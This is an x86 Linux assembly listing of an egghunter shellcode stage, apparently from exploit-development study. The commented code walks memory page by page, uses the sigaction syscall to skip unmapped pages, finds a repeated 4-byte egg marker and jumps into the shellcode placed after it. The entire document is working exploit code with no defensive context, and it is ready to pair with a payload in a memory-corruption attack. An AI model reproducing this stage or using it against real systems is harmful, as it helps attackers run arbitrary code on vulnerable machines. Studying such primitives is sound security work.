global _start

section .text

_start:
    cld                     ; clear the direction flag
IncPage:
    or cx, 0xfff            ; Align page address
IncAddr:
    inc ecx                 ; Go to next address
    push byte 0x43          ; syscall for sigaction()
    pop eax
    int 0x80                ; call sigaction() to check memory location [ECX]
    cmp al, 0xf2            ; Did it return EFAULT?
    jz IncPage              ; It did, skip page
    mov eax, 0x50905090     ; Store EGG in EAX
    mov edi, ecx            ; Move ECX to EDI for scasd operation
    scasd                   ; Check if [EDI] == EAX then increment EDI
    jnz IncAddr             ; It isn't, increment address
    scasd                   ; Check if [EDI] == EAX then increment EDI
    jnz IncAddr             ; It isn't, increment address
    jmp edi                 ; We found our Egg! JMP to EDI, which points directly to our shellcode
